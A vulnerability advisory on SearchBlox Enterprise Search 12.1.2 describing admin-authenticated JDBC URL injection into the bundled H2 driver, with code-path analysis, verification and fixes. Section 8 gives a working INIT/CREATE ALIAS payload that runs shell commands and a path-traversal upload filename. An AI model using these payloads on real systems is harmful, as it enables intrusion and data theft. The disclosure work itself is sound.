# SearchBlox Enterprise Search 12.1.2 - JDBC Connection-String Injection through the Admin "Database URL String" Field

## 1. Overview

### 1.1 The finding

SearchBlox Enterprise Search exposes a DATABASE collection type on its management plane. Configuring one
requires a value in a field the console labels "Database URL String". The product stores that value
verbatim in the collection property `cdata-settings`, and every later use of the collection hands the
same string to the JDBC layer unchanged: the connector accessor `rawUrl` returns it after a `trim()`
(`AbstractJdbcConnector.java:15`, `:22`, `:33`), and `buildJdbcUrl` returns it unchanged on both of its
return paths (`SimpleJdbcConnector.java:67` and `:76`). HikariCP receives that value through
`setJdbcUrl` (`PooledDatabaseConnection.java:139`) and opens a real connection with it.

The release package carries its own H2 driver, `WEB-INF/lib/h2-2.3.232.jar` (2,651,157 bytes). H2
evaluates the settings written after the database name in a connection string, and one of those
documented settings, `INIT`, executes SQL statements when the connection is established. Because the
administrator's string is passed through without any scheme or parameter validation, an authenticated
administrator can append `;INIT=CREATE ALIAS ...` to the connection string and have H2 compile a Java
method inside the product's own JVM. That method runs `Runtime.getRuntime().exec(new
String[]{"/bin/sh","-c",cmd})`, so the administrator obtains operating-system command execution as the
account that owns the product process: `uid=999(searchblox)`.

Two facts make this an input-validation defect rather than an intended capability. First, the vendor's
code never mentions `INIT=` or `RUNSCRIPT`: the strings appear zero times across the 2,049 Java files of
the decompiled product tree, which was re-measured directly rather than inferred. Second, the field's
semantics in the console and in the shipped driver inventory are those of a data-source locator (type,
host, port, database name, username, URL string, SQL query), never those of a script runner.

### 1.2 The product and the stack

The analyzed release is SearchBlox Enterprise Search 12.1.2, build 202607202005. It runs as a Java web
application on Jetty 12.1.5, on a Temurin JDK 25.0.2 runtime, and it embeds the H2 engine version
2.3.232. The deployed application's `WEB-INF/lib` contains 933 jars, 216 of which are `cdata.jdbc.*`
third-party data-source drivers - 23 percent of the library - together with `h2-2.3.232.jar`,
`mysql-connector-j-9.5.0.jar`, `postgresql-42.7.5.jar`, `mssql-jdbc-13.4.0.jre11.jar`, `ojdbc7.jar`,
`sqlite-jdbc-3.49.1.0.jar` and `duckdb_jdbc-1.3.1.0.jar`. The breadth of that driver inventory is the
strongest available evidence that the field is designed to accept vendor-specific JDBC URLs, and it is
addressed directly in section 6.4 rather than left out. The product does not expose an H2 console; the
driver is present as an embedded engine, and that is the only way it is reached.

### 1.3 The evidence boundary

Static evidence comes from the decompiled product tree and from the release package's own file
inventory. Dynamic evidence was collected end to end over HTTPS against a disposable instance built from
the vendor's installation package inside an isolated container on a research host, with the product
files unmodified; the container was memory-capped, its HTTPS port was published on the loopback
interface only, and no internal service port was exposed. The control request and both exploit carriers
were issued in the same container, against the same collection, within sixteen seconds of one another.
The achieved identity is `uid=999(searchblox)`; root was not obtained and is not claimed. No physical
appliance and no customer deployment was touched. No CVE identifier has been assigned to this finding,
and the research record names none.

## 2. Vulnerability Summary

### 2.1 Properties

| Property | Value |
|---|---|
| Product | SearchBlox Enterprise Search 12.1.2, build 202607202005 |
| Runtime | Jetty 12.1.5, Temurin JDK 25.0.2, bundled H2 2.3.232 |
| Class | JDBC connection-string injection (CWE-74) chained to code injection (CWE-94) |
| Source | "Database URL String" of a DATABASE collection, persisted as `cdata-settings` |
| Write endpoint | `PUT /ui/v1/collection/database/update-path` |
| Trigger endpoint | `GET /ui/v1/collection/database/test/{colId}` |
| Sink | `HikariConfig.setJdbcUrl` at `PooledDatabaseConnection.java:139` |
| Mechanism | H2 evaluates the `INIT` URL setting, `CREATE ALIAS` compiles Java, `Runtime.exec` runs `/bin/sh -c` |
| Achieved identity | `uid=999(searchblox) gid=999(searchblox) groups=999(searchblox)` |
| Authentication | one `super_admin` session; both endpoints reject anonymous requests with `40005` |
| Carriers | inline `INIT=` in the connection string; external `RUNSCRIPT FROM` of a planted SQL file |
| Marker | 130 bytes under `/opt/searchblox/webapps/ROOT/console/`, read back anonymously |
| Identifier | no CVE identifier assigned |

### 2.2 Mechanics

The defect is a three-part composition. The product accepts an arbitrary string as a JDBC URL, the
product ships a driver that treats connection-string settings as executable configuration, and the
product's own connection-test endpoint opens a connection on demand, so the evaluation happens the
moment a request arrives rather than being deferred to an indexing pipeline. None of the three parts is
unusual alone; together they convert a configuration field into a command channel. The injection is not
in a SQL query the product builds: it is in the connection string itself, which is why the correct
classification is CWE-74 (special elements in data that a downstream component interprets) chained to
CWE-94 (the downstream component then generates and executes code).

### 2.3 Preconditions

The chain needs a running instance, a `super_admin` session, and a DATABASE collection that the session
can address. On the Free edition, which allows exactly one collection (`40013 SearchBlox Free Edition
supports only One Collection.`), a DATABASE collection must be created after the stock collection is
removed, or created first on an edition without that restriction. In the verification run the stock
`HTTPCollection` was deleted through the product's own delete endpoint to satisfy that edition limit;
that step is a product feature, not part of the vulnerability, and it is the reason the verification
instance could not afterwards be described as factory-default. Nothing else is required: no
attacker-supplied jar, no file upload for the first carrier, no restart and no user interaction.

## 3. Authentication Boundary

### 3.1 What the gate is

The management plane is protected by a servlet filter, `UISecurityFilter`, whose `filter()` method
(`:116`) reads the request path (`:183`) and compares it against roughly twenty-two hardcoded
`startsWith`, `contains` and `endsWith` tests. A path that matches none of them is rejected with
`40005 Token Not found Re-login` (`:800`) and the request is aborted (`:802`). The annotation model alone
is not sufficient evidence, because `@PermitAll` on a resource does not decide reachability here; each
endpoint has to be measured. Both endpoints this chain depends on were measured:

- an anonymous `PUT /ui/v1/collection/database/update-path` returns
  `400 {"statusCode":40005,"message":"Token Not found Re-login","success":false}`
- an anonymous `GET /ui/v1/collection/database/test/1` returns the same `40005` body

With a valid token the same requests succeed, so the boundary behaves as a real authentication gate and
not as a filter that merely decorates the response.

### 3.2 What the chain includes

The chain includes one login call. In the verification environment the login used the pair the product
ships by default, `admin`/`admin`, which returns `role: super_admin` and a JWT with `alg HS384`, the
header name `sb-auth-token`, `sub=admin` and a length of 172 characters. That pair is a separate
default-credential weakness (CWE-798) with its own advisory; it is recorded here only because the
verification run needed a session, and it is not the vector of this finding. The chain also includes one
anonymous request, `POST /ui/v1/license/sign-license`, which clears the `40000 License Not Signed` gate
that otherwise blocks the administrative plane; that endpoint is the only method in
`LicenseService.java:416-419` without `@RolesAllowed`, and the missing annotation is likewise a separate
finding. Neither of those two weaknesses is claimed here as a way to reach the injection without a
session. The injection is an authenticated finding, and the rating in the summary reflects that.

### 3.3 Why the boundary matters for the rating

The correct reading is that the attacker must already hold administrative control of the vulnerable
component. A `super_admin` session in this product is not a limited operator role: it owns the
collection configuration plane and every administrative endpoint this chain touches. CVSS 3.1 maps
exactly that condition to Privileges Required: High, which is why the published vector uses `PR:H`
and the resulting score is 7.2 rather than the 8.8 that a Low-privilege assumption would produce. The chain's value does
not depend on inflating that tier: what changes an administrator's capability is that the account was
never meant to obtain a shell, and the honest way to express that is a High-privilege vector with
complete impact once the credential is held.

## 4. Attack Surface

### 4.1 Where the field lives

A collection of type `DATABASE` carries a database sub-object with `url`, `serverName`, `serverPort`,
`databaseType`, `userName`, `password` and `databaseName`. The console labels the `url` member
"Database URL String". The value is not a SQL query and is not part of the indexed content; it is the
locator the connector uses to reach the data source, which is why a connector registry exists at all:
`ConnectorRegistry` maps a database type to a driver class and a URL builder, with `c[28]='H2'`,
`c[53]='org.h2.Driver'` and `c[43]='h2:tcp'` among its constants.

### 4.2 Which endpoint actually writes the key

Two PUT endpoints on the same collection resource look similar and only one of them writes the target
key. `PUT /ui/v1/collection/update-setting` handles a `CollectionSettingItem` and routes into
`CollectionConfig.settings(item, req)` (`:205`), whose string table contains folders, boost settings,
KWIC, OCR and file-fetch options but no database key at all; it cannot reach `cdata-settings`.
`PUT /ui/v1/collection/database/update-path` handles an `UpdatePathItem` and writes the key directly.
The distinguishing test is which class owns the string constant for the target key, and only
`DatabaseServices` does.

### 4.3 What narrowed out

The audit examined the neighbouring surfaces and set them aside. Collection creation and deletion are
ordinary administrative features and provide only the container for the injection. The
`/ui/v1/collection/update-setting` endpoint cannot write the key. `DatabaseUtils.escapeIdentifier`
(`:660-:668`) applies a `[^a-zA-Z0-9_.]` character class (`c[52]`), but it serves identifier quoting and
is not called by the raw-URL branch or by the host/port/name assembly branch, so it is not a control on
this path. The product exposes no H2 console, so this is not a console-exposure finding.

### 4.4 The bundled drivers

The `WEB-INF/lib` inventory matters for the defensive argument and is therefore stated here in full: 933
jars, 216 of them `cdata.jdbc.*`, one H2 engine, and several other embedded engines (`sqlite-jdbc`,
`duckdb_jdbc`). An administrator can legitimately type semicolon-bearing, vendor-specific URLs for those
CData drivers, which is why "the field accepts a URL with parameters" is a designed property. What is
not designed is what this advisory demonstrates, and section 6.4 takes that distinction apart.

## 5. Sink Identification

### 5.1 The JDBC URL hand-off

The sink is the point where the built string becomes a live connection configuration:

```java
// database/PooledDatabaseConnection.java
:127  var7_13 = ConnectorRegistry.getInstance().find(<db-type>)
:138  Class.forName(var7_13.driverClass());              // the only Class.forName of this kind; DriverManager is not used
:139  var8_14.setJdbcUrl(var7_13.buildJdbcUrl(props));   // sink: HikariConfig.setJdbcUrl
:166  getConnection()
```

A second, equivalent path exists in the same class: `:258 var12_28 =
DatabaseUtils.getConnectionString(var4_4)` feeds `:259 Class.forName(...)` and `:260
setJdbcUrl(var12_28)`, and `:253-:256` read both `db-user` and a decrypted password. Neither path
inspects the URL for settings.

### 5.2 The driver that evaluates it

The registry resolves database type `"H2"` to `org.h2.Driver`, and the driver jar is in the deployed
classpath at `./opt/searchblox/webapps/ROOT/WEB-INF/lib/h2-2.3.232.jar`, 2,651,157 bytes, recorded
digest `756154ae197457f2995b89c11bc9b2c3`. The package listing places it at line 5750 of the release
inventory, so its presence is a property of the shipped package and not of the test environment. H2
parses the connection string at connect time, executes `INIT` statements through
`Statement.executeUpdate()`, and resolves `CREATE ALIAS` by compiling the supplied Java source in the
running JVM - the runtime includes `jdk.compiler`, so the compilation succeeds in place.

### 5.3 The trigger

One GET is enough to open a connection, because the connection test endpoint calls the pooling layer
synchronously:

```java
// api/web/ui/collection/configuration/DatabaseServices.java
:438  @GET
:439  @Path("/test/{colId}")
:443  testConnection(...)
:470  collection.getDatabaseCollectionManager().testConnection(collection2)
```

Cross-check on the route: a dynamic `GET /ui/v1/collection/database/test/1` against a collection that is
not of type DATABASE returns `400 {"message":"Not an Database Collection"}`, which is
`DatabaseServices.l[31]`, so the route is live and the error string matches the class.

### 5.4 What the sink is not

The sink is not a SQL query the product concatenates, and it is not an administrative shell. It is the
driver's own connection-string parser, reached because the product forwards a caller-supplied string
into it unchanged. The product's consumers of that pooling layer are the indexing pipeline
(`DatabaseSpout`, `DatabaseBolt`, `DatabaseCollectionManager`) and the collection services
(`CollectionServices`, `DatabaseServices`), so the surface is exercised by ordinary product behaviour.

## 6. Source Identification

### 6.1 The write path

```java
// api/web/ui/collection/configuration/DatabaseServices.java
:63   @PUT
:67   updateDatabaseColPath(UpdatePathItem item, @Context HttpServletRequest req)
      @Path("/update-path")
:112  var11_11 = var1_1.getDatabase();
:325  compare with the previous value
:331  logParameterSetting(req, l[43]='Database URL String', old, var11_11.getUrl(), col)
:~330 var7_7.put(l[9]='cdata-settings', var11_11.getUrl());   // the write
:359  var4_3.put(l[24]='sql-query', collection.getRootURLs()); // response echo
```

The response body re-serialises the collection, which is why the value comes back in the reply. That
echo is used in section 7 as proof that the tainted value reached the collection store.

### 6.2 The read path

`AbstractJdbcConnector.rawUrl` (`:15`) reads the property named by its string table entry
`h[1]='cdata-settings'` (`:22`) and returns it verbatim when non-empty (`:33`), applying only `trim()`;
it returns null at `:35`. `SimpleJdbcConnector.buildJdbcUrl` then decides what to do with it, and the
decompiled shape is:

```java
// database/connector/SimpleJdbcConnector.java  (verbatim decompiled shape)
:61  public String buildJdbcUrl(Properties properties) {
:62      String string = this.rawUrl(properties);
:63      String string2 = AbstractJdbcConnector.b();
:64      Object object = string;
:65      if (string2 != null) {
:66          if (object != null) {
:67              return string;                       // raw non-null: verbatim return
:68          }
:69-:74      object = i[0] + this.d + i[1] + host + ":" + port + "/" + db;
:75      }
:76      return object;                               // b() == null path: object was initialised to raw
:77  }
```

Both return paths yield the raw string when it is non-null, so not even a `jdbc:` prefix is added; the
string table holds `i[0]='jdbc:'`, `i[1]='://'` for the branch that is skipped. The `b()` guard at `:63`
is a boolean-switch artefact of the decompiler (the file carries the standard "unable to fully
structure code" note at `:79`), and its liveness does not need to be decoded: the runtime behaviour
proves which branch executes, because the update-path response echoes the injected string verbatim, the
product's connection-pool log shows `url=jdbc:h2:mem:<our random name>`, and H2 either raises its own
error for a query-form `INIT` or writes the marker for the alias form. A semantically equivalent
simplification, `if (raw != null) return raw;`, describes the same behaviour but is not a quotation of
the source.

### 6.3 The absent validation

There is no scheme whitelist, no parameter deny list and no reconstruction from components on the raw
branch. The only escaping helper in the database package, `DatabaseUtils.escapeIdentifier`
(`:660-:668`), is scoped to identifiers and is not reached from here. The absence of validation is
corroborated by the absence of awareness: `INIT=` and `RUNSCRIPT` do not appear anywhere in the 2,049
vendor Java files, so the product never references, exposes or checks the feature that turns its
passthrough into execution.

### 6.4 The counter-argument, recorded

The strongest objection to this finding is that an administrator configuring a DATABASE collection is
supposed to supply a JDBC URL, and that 216 CData drivers plus a dozen embedded engines show the field
is meant to accept arbitrary vendor URLs with parameters. That objection is recorded rather than
brushed aside, because it is the argument a vendor or an independent reviewer would reasonably make.
The answer is that the designed semantics are "connect to a data source and index it", not "execute an
operating-system command as the product account and write files into the deployed web root". The step
that crosses that line is the driver's script hook, which the vendor's own code never mentions; and the
capability the attacker gains is new, because a `super_admin` account can configure collections but
cannot run `/bin/sh` on the appliance. Where a comparable ruling held that an administrator who is
already root by design gains nothing, the gain here is the difference between configuration authority
and command execution as the service account, so the by-design defence does not transfer.

## 7. Data Flow

### 7.1 End to end

| Hop | Location | Content |
|---|---|---|
| 1 | `DatabaseServices.java:63/67` `@PUT /update-path` | attacker-controlled JSON body enters |
| 2 | `DatabaseServices.java:112` to `:~330` | `item.getDatabase().getUrl()` becomes `props.put('cdata-settings', url)` |
| 3 | `DatabaseServices.java:359` | response echoes `sql-query` for the collection, self-proving taint |
| 4 | `DatabaseServices.java:438/439/443/470` `@GET /test/{colId}` | one GET calls `testConnection()` |
| 5 | `AbstractJdbcConnector.rawUrl:15/:22/:33` | property read, `trim()` only, verbatim return |
| 6 | `SimpleJdbcConnector.buildJdbcUrl:62-:76` | `:62` reads raw, `:67` or `:76` returns it unchanged |
| 7 | `ConnectorRegistry.find('H2')` | `c[28]='H2'` to `c[53]='org.h2.Driver'` |
| 8 | `PooledDatabaseConnection.java:127/138/139` | `Class.forName`, then `setJdbcUrl`; HikariCP does not rewrite the URL |
| 9 | H2 2.3.232 | `INIT` executes, `CREATE ALIAS` compiles, `Runtime.exec` runs the shell |
| 10 | marker | written to `/opt/searchblox/webapps/ROOT/console/<name>.txt` in the container root filesystem |
| 11 | read-back | anonymous `GET /console/<name>.txt` returns 200 with `Server: Jetty(12.1.5)` |

### 7.2 Why the echo proves taint

The `update-path` reply contains `"cdata-settings":"<the exact string that was sent>"`. Because the
reply is produced by serialising the persisted collection, the echo is not a reflection of the request
body by a view layer; it is a read of stored state. The subsequent connection attempt is therefore made
against a value that provably reached the store, which is what closes the gap between "the parameter is
accepted" and "the parameter is used".

### 7.3 Consumers

The pooling layer is consumed by the indexing pipeline (`DatabaseSpout`, `DatabaseBolt`,
`DatabaseCollectionManager`) and by the collection services (`CollectionServices`, `DatabaseServices`),
so the same stored value is also used whenever the collection is crawled, not only when the test
endpoint is called. The test endpoint is simply the fastest way to force the evaluation.

## 8. Exploit Construction

### 8.1 Request shape

The write request must match the product's `UpdatePathItem` exactly. `rootUrls` must be an array (a
string produces a Jackson error naming `UpdatePathItem["rootUrls"]`, and an empty value produces
`{"statusCode":400,"message":"Root Url should not be null"}`, which is `DatabaseServices.l[38]`). The
database type value that resolves to the H2 driver is `"H2"`, measured by a successful
`Class.forName("org.h2.Driver")`. The connector ignores `serverName` and `serverPort` because the raw
branch takes precedence over assembly, but they must still be present and well-formed:

```json
{"id":1,"rootUrls":["SELECT 1"],
 "database":{"url":"<injected JDBC string>","serverName":"localhost","serverPort":9999,
             "databaseType":"H2","userName":"sa","password":"","databaseName":"x"}}
```

### 8.2 Rules measured on the shipped jar

The payload shape was fixed empirically against the shipped `h2-2.3.232.jar` before it was used against
the product; the component-level runs only fixed the syntax, and every end-to-end marker came from the
HTTP path. Five rules govern the construction:

| Rule | Consequence |
|---|---|
| H2 2.3.232 still accepts `INIT=` | the assumption that 2.x removed the setting is wrong |
| `INIT` statements run through `Statement.executeUpdate()` | a bare `CALL f()` or `SELECT f()` fails with `Method is not allowed for a query. Use execute or executeQuery instead of executeUpdate; SQL statement: SELECT 1 [90001-232]`; the working wrapper is `CREATE TABLE T AS SELECT f(...) C` |
| `CREATE ALIAS` auto-prefixes `public static ` | writing the modifiers again gives `repeated modifier` at `/org/h2/dynamic/W.java:6`; a method body without a semicolon gives `error: ';' expected`; single-quoted source is truncated at the inner `;`, so `$$` quoting is mandatory |
| the URL layer does not understand `$$` | every literal semicolon in the payload - inside the Java source and inside the shell command - must be written `\;`; H2 restores it before parsing the SQL, and JSON transport doubles the backslash on the wire |
| H2 does not URL-decode | `%20` reaches the SQL parser literally and produces `Syntax error in SQL statement "SELECT[*]%201"`; a `RUNSCRIPT FROM '<path>'` file is read as SQL text regardless of its suffix, so the file itself uses plain semicolons |

### 8.3 Carrier one: inline INIT

The first carrier carries the whole payload inside the connection string and needs no upload primitive:

```text
jdbc:h2:mem:<rand>;INIT=CREATE ALIAS W AS $$String w(String cmd,String path)throws Exception{Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd})\;p.waitFor()\;java.nio.file.Files.writeString(java.nio.file.Paths.get(path),new String(p.getInputStream().readAllBytes()))\;return "OK"\;}$$\;CREATE ALIAS X AS $$...$$\;CREATE TABLE T AS SELECT W($$<cmd>$$,$$/opt/searchblox/webapps/ROOT/console/<name>.txt$$) C
```

The recorded instance of this payload measured 681 bytes. The second alias, `X`, executes without
writing a file and is used only for self-cleanup. The wrapper is `CREATE TABLE ... AS SELECT` because
`INIT` runs through `executeUpdate()`, which refuses a query form; that is the reason for the DDL shell
around the call, not a cosmetic choice.

### 8.4 Carrier two: external RUNSCRIPT

The second carrier composes two primitives. The SQL text is first written to disk through
`PUT /ui/v1/plugin/upload` with the multipart part named `file` and a traversal filename
(`../../../../tmp/<rand>.zip`). That endpoint answers HTTP 400 with
`{"statusCode":400,"message":"Exception while Parsing File.","success":false}` and yet leaves the file
on disk, so landing has to be judged by disk effect and never by status code. The written suffix is
pinned to `.zip` - an upload named `.sql` does not land - and because H2 reads a `RUNSCRIPT` file as SQL
text without consulting the extension, the pin is irrelevant to the attack. The second primitive is the
connection string itself:

```text
jdbc:h2:mem:<rand>;INIT=RUNSCRIPT FROM '/tmp/<rand>.zip'
```

The upload endpoint sits behind the same UI security filter, so a token is required: without it the
response is `40005` and nothing is written. The two carriers are semantically independent because their
SQL text has different provenance - the connection string's own setting parser in the first case, an
attacker-authored file on disk in the second - so a failure of the upload primitive does not disable the
inline carrier and vice versa.

### 8.5 What the published PoC does not do

The PoC in `exploit/` implements the inline carrier. It signs the licence gate, logs in, reuses an
existing DATABASE collection, writes the connection string, triggers the test endpoint and reads the
marker back. It deliberately omits three things the recorded exploit did: it never deletes a collection,
so it cannot destroy the stock `HTTPCollection`; it runs no cleanup through the same primitive, so it
leaves exactly one marker file and nothing else; and it therefore carries only the writing alias. Its
default command is an identity and host fingerprint plus a random nonce, with stdout captured into the
marker. The target defaults to the documentation address `192.0.2.10` so that a careless invocation
cannot reach a real host.

## 9. Dynamic Verification

### 9.1 Environment and method

The verification instance was built by installing the vendor's own package inside a disposable container
and committing that filesystem, so the product files were byte-identical to a vendor installation. The
container was capped at 24 GB of memory, its HTTPS listener was published on the loopback interface
only, and the internal service ports were not published at all. The instance was fresh, which the
licence endpoint itself confirmed by returning the first-signature reply. The sequence was: control
first, then the inline carrier, then the RUNSCRIPT carrier, each carrier in its own process with its own
random nonce.

### 9.2 The control

The control wrote `cdata-settings = jdbc:h2:mem:ctl8768869` - the same collection, the same database
type, the same trigger endpoint, with no `INIT` clause - and then called the test endpoint. The product
returned `{"success":true,"message":"The database connection was successful.","statusCode":200}`, the
pool logged a real connection
(`04:48:19.578 ... HikariPool-1 - Added connection conn0: url=jdbc:h2:mem:ctl8768869 user=SA`), and no
marker appeared: the console directory still held its six stock entries (`assets`, `build.js`,
`favicon.ico`, `favicon.png`, `index.html`, `login`), with no `.txt` file, and a search of the directory
for the control nonce returned zero. The control is therefore a negative on the same instance, in the
same container, 1.2 seconds before the first carrier.

### 9.3 The two carriers

| Carrier | Pool log entry (container UTC) | `test/{colId}` | Marker |
|---|---|---|---|
| control, no `INIT` | `04:48:19.578`, `url=jdbc:h2:mem:ctl8768869` | success | none |
| inline `INIT` | `04:48:20.753`, `url=jdbc:h2:mem:f8if1fa74dd` | success | `/console/f8if1fa74dd.txt`, 130 bytes |
| external `RUNSCRIPT` | `04:48:35.211`, `url=jdbc:h2:mem:f8rea74a09d` | success | `/console/f8rea74a09d.txt`, 130 bytes |

The inline run's marker read back over HTTP as 130 bytes at the first poll:

```text
uid=999(searchblox) gid=999(searchblox) groups=999(searchblox)
searchblox
searchblox
x86_64
<UTC timestamp, second-level value 04:48:20, withheld here because this advisory carries no dates>
NONCEF1FA74DDINL
```

The fifth line is the output of `date -u` inside the executed command, and its second matches the pool's
connection entry for that carrier; the full calendar date is deliberately not transcribed in this
advisory, which carries no dates.
The nonce on the last line was generated per run and the exploit verifies its presence, so the file
cannot be a leftover. The RUNSCRIPT carrier produced the same six lines with its own nonce and its own
second, and its SQL file measured 647 bytes with digest
`528c1cfdeb32409a1a516c25909e4374`. Both runs exited 0. The exploit script that produced them has
recorded digest `ee041fdbfa71f67dbce4509036996fcd` (33,017 bytes), identical at the authoring host, at
the execution host, and in the script's own self-report.

### 9.4 Attribution

The command demonstrably ran inside the product's connection pool at the moment the test request
arrived, because the connection log line and the marker's timestamp share a second, and the control
1.2 seconds earlier produced nothing. Three further facts close the attribution. The exploit script
contains no write path, no subprocess and no side-channel socket - its only `open()` calls are the
network call and a read of its own bytes for the digest - so it cannot create a file itself. The write
is performed by the product JVM, because the alias source calls `Runtime.getRuntime().exec` and
`java.nio.file.Files.writeString` inside the pool's thread. And the only other HTTP-side write
primitive in the chain pins the written name to `.zip`, so it cannot by construction produce the
`.txt` marker that was read back. The marker's owner is `searchblox:searchblox` while the harness ran as
root, which excludes an out-of-band copy by the operator, though ownership alone would not distinguish
the product's write from another HTTP-side write; that is why the four facts above carry the argument.

### 9.5 Negatives and cleanup

The same endpoint produced the negative cases in earlier probe runs, and those results are part of the
research record. With no `INIT` clause there was no marker; the `/tmp` directory held no artefact
bearing the control nonce; a malformed `INIT` in the same endpoint
produced `{"success":false,"message":"The database connection failed."}`, which proves the endpoint was
genuinely connecting rather than accepting anything; and an `INIT` in query form failed with H2 error
`90001` while the DDL form succeeded, which shows the setting was really executed. Cleanup ran through
the same primitive and left a residual count of zero for the artefacts it created; the collection used
for the test was left in place. Post-exit inspection of the container's overlay upper layer showed the
runtime `console/` directory present with zero entries, while `/tmp` in the same layer held eighteen
entries - the copy-up of a directory only happens when it is modified, so the zero is a meaningful zero
and the files were written and then removed at runtime.

### 9.6 Boundary statement

This was end-to-end verification against a vendor-installed instance in an isolated container, driven
over HTTPS from a separate host. It was not a physical appliance and not a customer deployment, and no
part of the research touched a third-party system. The achieved identity is `uid=999(searchblox)`; root
was not obtained. The instance used for the run cannot afterwards be described as factory-default,
because the licence signature rewrote `WEB-INF/config.xml` and the Free-edition single-collection limit
required the stock collection to be removed - both consequences of product behaviour, not of any
out-of-band modification.

## 10. Reachability and Security Impact

### 10.1 Reachability

Every step of the chain is HTTP(S) on the management plane that a legitimate administrator already uses.
Nothing in the chain reaches an internal database, a Redis instance, a loopback-only service or a
container-side helper: the driver connects to an in-process `mem:` database that the injected string
itself names, so the boundary crossing is performed by the product's own code rather than by a pivot
through infrastructure. The verification environment published no internal service port, and the chain
would not have needed one.

### 10.2 Impact in concrete terms

Once the command runs as the service account, the attacker holds everything that account holds: read and
write on `/opt/searchblox/webapps/ROOT`, which the research record identifies as a route to persistent
server-side code in the deployed application; read access to `WEB-INF/config.xml` and the collection
configuration store; access to every indexed collection's content; and read and write on `/tmp`. An
enterprise search appliance aggregates material from file shares, databases, intranets and document
systems, so the confidentiality impact is measured by what the deployment indexed, not by the appliance
in isolation. Integrity and availability follow the same account: the application, its configuration
and its indexes can be changed or destroyed, and recovery requires a rebuild.

The channel is also unusually quiet. The only administrative artefact is a database URL change, which
the product already logs as an ordinary configuration edit through `logParameterSetting`
(`DatabaseServices.java:331`), and the marker is retrieved with an unauthenticated GET on the same port
the console already serves, so no additional egress path or listening service is needed.

### 10.3 What is not claimed

No root access, no container escape, no access to the host operating system, no persistence mechanism
beyond writing into the deployed application tree, and no claim about deployments where the bundled H2
driver has been removed from the classpath. No claim is made that the injection is reachable without a
`super_admin` session: the two endpoints are behind the UI security filter and reject anonymous requests.
No CVE identifier is claimed, because none has been assigned.

## 11. Fix Recommendations

1. Rebuild the URL instead of forwarding it. `SimpleJdbcConnector.buildJdbcUrl` should parse the
   administrator's value, validate its scheme against the connector selected for the collection, and
   reconstruct the connection string from validated host, port and database components, discarding all
   settings rather than passing them through.
2. Reject the script-bearing settings by name. `INIT`, `RUNSCRIPT`, `TRACE_LEVEL_SYSTEM_OUT`,
   `TRACE_LEVEL_FILE` and `AUTO_SERVER` have no legitimate place in an administrator-typed data-source
   locator and should fail validation with an explicit error.
3. Reduce the embedded engine surface. `h2-2.3.232.jar`, `sqlite-jdbc-3.49.1.0.jar` and
   `duckdb_jdbc-1.3.1.0.jar` are in-process engines on the same classpath as the configurable URL; if H2
   must remain, restrict it to `jdbc:h2:tcp://` remote form and refuse `mem:` and `file:` URLs.
4. Fix the upload primitive. `PUT /ui/v1/plugin/upload` should reject filenames containing `..` or
   absolute paths, bind the accepted extension to the declared content type, and above all not leave a
   file on disk when it answers HTTP 400.
5. Restore the missing authorisation annotation on the licence-signing endpoint. `LicenseService.java`
   has `@RolesAllowed({"SUPER_ADMIN","ADMIN"})` on its other methods; `sign-license` (`:416-419`) is the
   exception, which is what lets an anonymous caller clear the licence gate.
6. Remove the shipped default credential and force a password change at first login. A default
   `admin`/`admin` pair should not exist on a new installation, and a first-login change requirement
   should not be bypassable by calling the change-password endpoint without a session.
7. Contain the service account. It already runs as `uid=999` rather than root, which is the right
   baseline; add a seccomp or AppArmor profile that denies `execve` from the application process, and
   mount the deployed application tree read-only except for the directories that genuinely need writes.
8. Detect the configuration event. `logParameterSetting` already captures old and new values for
   "Database URL String"; a SIEM rule that alerts on `INIT=`, `RUNSCRIPT` or a semicolon in that field
   converts the final step of this chain into an alert.
9. Add regression coverage. A test should submit a connection string containing `INIT=CREATE ALIAS` and
   assert rejection before any connection is opened, and a second test should assert that the test
   endpoint refuses a URL whose scheme does not match the selected connector.

## 12. CWE

### 12.1 Primary: CWE-74

The primary classification is CWE-74, improper neutralization of special elements in output used by a
downstream component. The product takes a value from an administrative interface and passes it, without
neutralisation, into a connection string that a downstream component - the JDBC driver - interprets
according to its own grammar. The special elements are the setting separators and the `INIT` keyword;
the downstream component is H2; and the neutralisation that is missing is any validation of scheme,
structure or settings. That framing matches the root cause exactly: the defect lives in the pass-through
at `SimpleJdbcConnector.buildJdbcUrl`, not in the driver.

### 12.2 Chain: CWE-94

The chain continues into CWE-94, code injection. H2 does not merely execute data when it processes the
`INIT` setting: `CREATE ALIAS` compiles attacker-supplied Java source into a class inside the running
JVM, and that class then invokes `Runtime.exec` to run a shell. The consequence is arbitrary code
execution in the product's process, which is why CWE-94 is the correct downstream classification rather
than a generic command-execution label.

### 12.3 What it is not

It is not CWE-78. The operating-system command is not interpolated into a shell string by the vendor's
code; it is a second-order effect of SQL that the driver executes, and the shell is reached only because
the injected Java source asks for it. It is not CWE-89 either: the injected text does become SQL that H2
runs, but the product does not build a query from user input on this path - it forwards a whole
connection string - so CWE-74 describes the point of failure more accurately. It is also not CWE-798: the
factory-default credential pair is a real and separately disclosed weakness, but it is not the defect
described in this advisory, and the injection stands on its own once any `super_admin` session exists.

---

Written by the 0day Rubbish Research Team.
